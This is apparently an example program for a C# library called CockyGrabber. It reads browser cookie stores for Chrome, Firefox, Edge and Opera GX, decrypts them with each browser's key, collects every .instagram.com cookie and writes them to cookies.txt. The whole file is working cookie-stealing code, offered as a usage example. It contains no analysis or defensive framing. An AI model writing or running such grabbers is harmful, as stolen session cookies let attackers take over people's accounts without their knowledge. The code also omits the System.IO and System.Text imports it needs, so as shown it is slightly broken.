using CockyGrabber;
using System;
namespace GrabberExamples
{
    class Program
    {
        static void Main(string[] args)
        {
            StringBuilder instagramCookies = new StringBuilder();
            
            ChromeGrabber cg = new ChromeGrabber(); FirefoxGrabber fg = new FirefoxGrabber(); EdgeGrabber eg = new EdgeGrabber(); OperaGxGrabber og = new OperaGxGrabber();
            if (cg.CookiesExists())
            {
                foreach (var item in cg.GetCookiesByHostname(".instagram.com", cg.GetKey()))
                {
                    instagramCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                }
            }
            if (fg.CookiesExists())
            {
                foreach (var item in fg.GetCookiesByHostname(".instagram.com"))
                {
                    instagramCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                }
            }
            if (eg.CookiesExists())
            {
                foreach (var item in eg.GetCookiesByHostname(".instagram.com", eg.GetKey()))
                {
                    instagramCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                }
            }
            if (og.CookiesExists())
            {
                foreach (var item in og.GetCookiesByHostname(".instagram.com", og.GetKey()))
                {
                    instagramCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                }
            }
            
            File.WriteAllText("cookies.txt", instagramCookies.ToString());
            Console.WriteLine("Cookies Grabbed and saved Successfully!");
            Console.ReadKey();
        }
    }
}
